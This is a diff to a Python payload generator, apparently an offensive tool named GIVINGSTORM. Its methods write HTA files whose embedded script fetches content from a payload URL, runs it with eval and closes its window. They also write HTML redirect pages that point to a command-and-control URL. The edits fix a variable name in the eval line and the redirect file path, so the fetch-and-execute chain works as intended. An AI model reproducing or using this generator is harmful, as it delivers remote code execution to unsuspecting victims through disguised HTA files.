@@ -46,9 +46,9 @@ class GIVINGSTORM:
             hta += str(virtual_payload)
             hta += '", False'
             hta += "\nscriblin.send\n"
-            hta += "GIVINGSTORMt = scriblin.responsetext\n"
+            hta += "GIVINGSTORM = scriblin.responsetext\n"
             hta += "</script>\n"
-            hta += "<script type=text/javascript>eval(GIVINGSTORMt);</script>\n"
+            hta += "<script type=text/javascript>eval(GIVINGSTORM);</script>\n"
             hta += "</head>\n"
             hta += "<body>\n"
             hta += "<script type=text/javascript>self.close();</script>\n"
@@ -147,7 +147,9 @@ class GIVINGSTORM:
            print(f"Error encountered...\nReview the following: {str(e)}")
 
     def generate_redirect(self, name, c2url):
-        virtual_redirect = "./Payloads/" + name + ".html"
+        virtual_redirect_file = "./Payloads/" + name + ".html"
+        virtual_redirect = name + ".hta"
+
         try:
             redirect = "<html>\n"
             redirect += "<head>\n"
@@ -165,7 +167,7 @@ class GIVINGSTORM:
             redirect += "</body>"
             redirect += "</html>"
 
-            rf = open(virtual_redirect, "w+")
+            rf = open(virtual_redirect_file, "w+")
             rf.write(redirect)
             rf.close()
 
